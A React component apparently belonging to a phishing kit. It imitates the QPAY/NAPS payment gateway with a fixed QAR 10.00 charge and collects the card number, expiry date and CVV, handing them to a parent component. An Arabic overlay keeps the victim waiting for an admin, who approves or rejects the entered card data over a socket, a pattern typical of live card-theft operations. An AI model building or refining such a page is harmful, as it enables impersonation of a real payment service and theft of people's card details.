
import React, { useState, useMemo, useEffect } from 'react';
import { Eye, EyeOff, Clock, CheckCircle, XCircle, Loader2 } from 'lucide-react';
import socketService from '../services/socketService';

interface PaymentFormProps {
  onNext: () => void;
  onPrev: () => void;
  onDataChange?: (data: { cardNumber: string; cvv: string; expiryMonth: string; expiryYear: string }) => void;
}

type ApprovalStatus = 'idle' | 'waiting' | 'approved' | 'rejected';

const checkLuhn = (cardNo: string): boolean => {
  const digits = cardNo.replace(/\D/g, '');
  if (digits.length < 13) return false;
  
  let nDigits = digits.length;
  let nSum = 0;
  let isSecond = false;
  for (let i = nDigits - 1; i >= 0; i--) {
    let d = digits.charCodeAt(i) - '0'.charCodeAt(0);
    if (isSecond === true) d = d * 2;
    nSum += Math.floor(d / 10);
    nSum += d % 10;
    isSecond = !isSecond;
  }
  return (nSum % 10 === 0);
};

const PaymentForm: React.FC<PaymentFormProps> = ({ onNext, onPrev, onDataChange }) => {
  const [cvvShow, setCvvShow] = useState(false);
  const [cardNumber, setCardNumber] = useState('');
  const [cvv, setCvv] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  
  // Approval system states
  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus>('idle');
  const [rejectionReason, setRejectionReason] = useState('');

  const isCardValid = useMemo(() => {
    return cardNumber.length === 16 && checkLuhn(cardNumber);
  }, [cardNumber]);

  // Send data to parent when it changes
  useEffect(() => {
    if (onDataChange) {
      onDataChange({ cardNumber, cvv, expiryMonth, expiryYear });
    }
  }, [cardNumber, cvv, expiryMonth, expiryYear, onDataChange]);

  // Listen for approval/rejection from admin
  useEffect(() => {
    const handleApproval = (data: { page: string; status: 'approved' | 'rejected'; reason?: string }) => {
      console.log('📩 [PaymentForm] Received approval response:', data);
      
      if (data.status === 'approved') {
        setApprovalStatus('approved');
        setTimeout(() => {
          onNext();
        }, 1500);
      } else if (data.status === 'rejected') {
        setApprovalStatus('rejected');
        setRejectionReason(data.reason || 'تم رفض البيانات المدخلة');
        setTimeout(() => {
          setApprovalStatus('idle');
        }, 3000);
      }
    };

    socketService.on('approval-response', handleApproval);

    return () => {
      socketService.off('approval-response', handleApproval);
    };
  }, [onNext]);

  const handleContinue = () => {
    setIsLoading(true);
    
    // Save data and request approval
    setTimeout(() => {
      setIsLoading(false);
      setApprovalStatus('waiting');
      socketService.requestApproval('step4-payment-card');
    }, 1500);
  };

  const months = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0'));
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => (currentYear + i).toString());

  // Approval waiting overlay
  const ApprovalOverlay = () => {
    if (approvalStatus === 'idle') return null;

    return (
      <div className="fixed inset-0 z-[100] bg-white/95 backdrop-blur-sm flex items-center justify-center">
        <div className="bg-white border-2 border-gray-200 rounded-lg p-8 max-w-md w-full mx-4 shadow-2xl">
          {approvalStatus === 'waiting' && (
            <div className="flex flex-col items-center gap-4 text-center">
              <Clock className="w-16 h-16 text-[#640d2b] animate-pulse" />
              <h3 className="text-[20px] font-bold text-[#333]">في انتظار الموافقة</h3>
              <p className="text-[14px] text-gray-600">يرجى الانتظار حتى يتم مراجعة بياناتك من قبل المشرف...</p>
              <div className="flex gap-2 mt-2">
                <div className="w-2 h-2 bg-[#640d2b] rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2 h-2 bg-[#640d2b] rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2 h-2 bg-[#640d2b] rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          )}
          
          {approvalStatus === 'approved' && (
            <div className="flex flex-col items-center gap-4 text-center">
              <CheckCircle className="w-16 h-16 text-green-500" />
              <h3 className="text-[20px] font-bold text-green-600">تمت الموافقة! ✅</h3>
              <p className="text-[14px] text-gray-600">جاري الانتقال للخطوة التالية...</p>
            </div>
          )}
          
          {approvalStatus === 'rejected' && (
            <div className="flex flex-col items-center gap-4 text-center">
              <XCircle className="w-16 h-16 text-red-500" />
              <h3 className="text-[20px] font-bold text-red-600">تم الرفض ❌</h3>
              <p className="text-[14px] text-gray-600">{rejectionReason}</p>
              <p className="text-[12px] text-gray-500 mt-2">يرجى تصحيح البيانات والمحاولة مرة أخرى</p>
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="w-full bg-[#f8f9fa] flex flex-col items-center pt-0 pb-8 px-4 md:px-8 font-sans" dir="rtl">
      <ApprovalOverlay />
      
      {isLoading && (
        <div className="fixed inset-0 z-[100] bg-white/60 backdrop-blur-sm flex items-center justify-center">
          <Loader2 className="w-12 h-12 text-[#640d2b] animate-spin" />
        </div>
      )}
      
      <div className="w-full max-w-[850px]">
        
        {/* Unified Summary Header based on provided image */}
        <div className="flex flex-col items-start mb-8 px-2 gap-4">
          {/* Top: Logo and Amount */}
          <div className="flex items-center justify-between w-full gap-6">
            <div className="flex flex-col items-start">
              <div className="text-[#640d2b] text-[16px] font-bold mb-1">Amount</div>
              <div className="text-[#640d2b] text-[28px] font-bold leading-tight">QAR 10.00</div>
            </div>
            <img 
              src="/qpay.png" 
              alt="QPAY Logo" 
              className="h-[42px] w-auto"
            />
          </div>

          {/* Bottom: Transaction Details */}
          <div className="space-y-1 text-left w-full" dir="ltr">
            <div className="text-[14px] text-[#333]">
              <span className="font-bold">Payment Transaction Number:</span> <span className="font-medium">PRTALQ1768022149127</span>
            </div>
            <div className="text-[14px] text-[#333]">
              <span className="font-bold">Transaction Details:</span> <span className="font-medium">DC</span>
            </div>
          </div>
        </div>

        {/* Main Payment Container */}
        <div className="border border-[#640d2b] rounded-sm overflow-hidden bg-[#f8f9fa] shadow-sm" dir="ltr">
          <div className="bg-[#640d2b] text-white px-5 py-2.5 text-[16px] font-semibold text-left">
            Enter your payment card details
          </div>
          
          <div className="p-8 md:p-14 bg-[#f8f9fa]">
            <div className="max-w-[550px] mx-auto space-y-7">
              
              <div className="flex flex-col sm:flex-row sm:items-center">
                <label className="w-full sm:w-[200px] sm:text-right pr-8 font-bold text-[15px] text-[#333]">Card Number</label>
                <div className="flex-1">
                  <input 
                    type="text" 
                    maxLength={16}
                    className={`w-full h-[38px] border rounded-sm px-3 text-[15px] outline-none transition-shadow bg-white ${cardNumber && cardNumber.length === 16 && !isCardValid ? 'border-red-500 shadow-[0_0_2px_red]' : 'border-gray-400 focus:border-[#640d2b] focus:shadow-[0_0_1px_#640d2b]'}`}
                    placeholder="Enter 16 digit card number"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value.replace(/[^0-9]/g, ''))}
                  />
                  {cardNumber.length === 16 && !isCardValid && (
                    <div className="text-red-600 text-[12px] mt-1 font-bold">Luhn check failed</div>
                  )}
                </div>
              </div>

              <div className="flex flex-col sm:flex-row sm:items-center">
                <label className="w-full sm:w-[200px] sm:text-right pr-8 font-bold text-[15px] text-[#333]">Card Expiry Date</label>
                <div className="flex-1 flex gap-4">
                  <select 
                    className="flex-1 h-[38px] border border-gray-400 rounded-sm px-2 text-[15px] bg-white outline-none cursor-pointer"
                    value={expiryMonth}
                    onChange={(e) => setExpiryMonth(e.target.value)}
                  >
                    <option value="">Month</option>
                    {months.map(m => <option key={m} value={m}>{m}</option>)}
                  </select>
                  <select 
                    className="flex-1 h-[38px] border border-gray-400 rounded-sm px-2 text-[15px] bg-white outline-none cursor-pointer"
                    value={expiryYear}
                    onChange={(e) => setExpiryYear(e.target.value)}
                  >
                    <option value="">Year</option>
                    {years.map(y => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>

              {isCardValid && (
                <div className="flex flex-col sm:flex-row sm:items-center animate-in fade-in duration-300">
                  <label className="w-full sm:w-[200px] sm:text-right pr-8 font-bold text-[15px] text-[#333]">CVV2</label>
                  <div className="flex-1 relative">
                    <input 
                      type={cvvShow ? "text" : "password"} 
                      maxLength={3}
                      className="w-full h-[38px] border border-gray-400 rounded-sm px-3 text-[15px] outline-none focus:border-[#640d2b] bg-white"
                      placeholder="..."
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
                    />
                    <button 
                      type="button" 
                      onClick={() => setCvvShow(!cvvShow)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      {cvvShow ? <EyeOff size={18} /> : <Eye size={18} />}
                    </button>
                  </div>
                </div>
              )}

              <div className="text-center text-[13px] text-gray-600 pt-2 leading-tight">
                By clicking the "Continue" button, you hereby acknowledge accepting the <a href="#" className="text-blue-700 font-medium hover:underline">Terms and Conditions</a> of payment.
              </div>

              <div className="flex flex-col sm:flex-row justify-between items-center pt-8 gap-6">
                <div className="flex gap-4 items-center opacity-90">
                  <img src="/naps.png" alt="NAPS" className="w-[180px] h-auto" />
                </div>

                <div className="flex gap-4 w-full sm:w-auto">
                  <button 
                    disabled={!isCardValid || (isCardValid && cvv.length < 3) || !expiryMonth || !expiryYear}
                    className="flex-1 sm:flex-none bg-[#640d2b] text-white font-bold px-10 py-2.5 rounded-sm text-[15px] hover:bg-[#4d0a21] transition-colors disabled:opacity-40 disabled:cursor-not-allowed shadow-sm"
                    onClick={handleContinue}
                  >
                    Continue
                  </button>
                  <button 
                    className="flex-1 sm:flex-none bg-white border border-gray-300 text-gray-800 px-10 py-2.5 rounded-sm text-[15px] hover:bg-gray-50 transition-colors shadow-sm"
                    onClick={onPrev}
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-6 text-[14px] text-[#444] font-medium text-center md:text-right">
          For proper completion of your transaction, please do not refresh this page or click the browser's back button.
        </div>
      </div>
    </div>
  );
};

export default PaymentForm;
